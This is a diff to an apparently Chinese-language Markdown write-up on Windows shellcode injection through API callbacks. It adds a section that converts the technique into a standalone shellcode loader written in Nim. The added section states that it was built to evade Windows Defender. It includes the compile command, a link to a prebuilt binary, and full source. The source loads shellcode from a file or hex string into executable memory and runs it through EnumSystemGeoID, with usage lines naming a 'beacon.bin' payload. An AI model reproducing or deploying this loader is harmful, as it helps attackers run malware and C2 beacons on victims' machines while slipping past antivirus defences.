@@ -1,6 +1,6 @@
 # Shellcode Injection via Callbacks
 
-通过回调函数进行shellcode注入，支持以下13各方法：
+通过回调函数进行shellcode注入，支持以下13各方法，本文最后给出shellcode加载器。
 
 1,  EnumTimeFormatsA 			
 2,  EnumWindows				
@@ -297,6 +297,87 @@ when defined(windows):
 ## 截图1
 
 ![截图](https://files-cdn.cnblogs.com/files/StudyCat/shellcode_callback_bin.bmp)
+
+## 改造成 shellcode 加载器
+
+我在 windows 10下运行以上代码，很显然都被 defender 干掉了，所以要做分离。代码如下：
+
+nim c --cpu:i386 -d:realese --opt:size shellcodeRun.nim
+
+[已经编译好的 shellcodeRun.exe](https://github.com/StudyCat404/myNimExamples/blob/main/examples/shellcodeRun.exe)
+
+``` shellcodeRun.nim
+#[
+    Author: StudyCat
+    Blog: https://www.cnblogs.com/studycat
+    Github: https://github.com/StudyCat404/myNimExamples
+]#
+import winim/lean
+import osproc
+import stew/byteutils
+import os
+import strutils
+
+proc shellcodeCallback(shellcode: openarray[byte]): void =
+    let tProcess = GetCurrentProcessId()
+    echo "Powered by StudyCat"
+    echo "[*] Target Process: ", tProcess
+    echo "    \\-- bytes written: ", shellcode.len
+    echo "[+] Injected"
+    
+    # Allocate memory
+    let rPtr = VirtualAlloc(
+        nil,
+        cast[SIZE_T](shellcode.len),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READ_WRITE
+    )    
+    
+    # Copy Shellcode to the allocated memory section
+    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))    
+    
+    # Callback execution
+    EnumSystemGeoID(
+        16,
+        0,
+        cast[GEO_ENUMPROC](rPtr)
+    ) 
+
+
+proc main() =    
+    if fileExists(paramStr(1)):
+        var 
+            filename = paramStr(1)
+            file: File
+            
+        file = open(filename, fmRead)
+        var fileSize = file.getFileSize() 
+        var shellcode = newSeq[byte](fileSize)
+        discard file.readBytes(shellcode, 0, fileSize)
+        shellcodeCallback(shellcode)
+        file.close()
+    else:
+        var hexstr: string = paramStr(1)
+        var shellcode = newSeq[byte](len(hexstr) div 2)
+        hexToByteArray(hexstr, shellcode)
+        shellcodeCallback(shellcode)    
+    
+when defined(windows):
+    if 2 > 1:
+        if paramCount() > 0 :           
+            main()
+        else:
+            let pathSplit = splitPath(paramStr(0))
+            echo "Usage: ", pathSplit.tail, " fce88900000...648b52308b"
+            echo "Usage: ", pathSplit.tail, " beacon.bin"    
+    
+```
+
+截图
+
+![截图](https://files-cdn.cnblogs.com/files/StudyCat/shellcodeRun01.bmp)
+
+![截图](https://files-cdn.cnblogs.com/files/StudyCat/shellcodeRun02.bmp)
 
 ## 引用
 
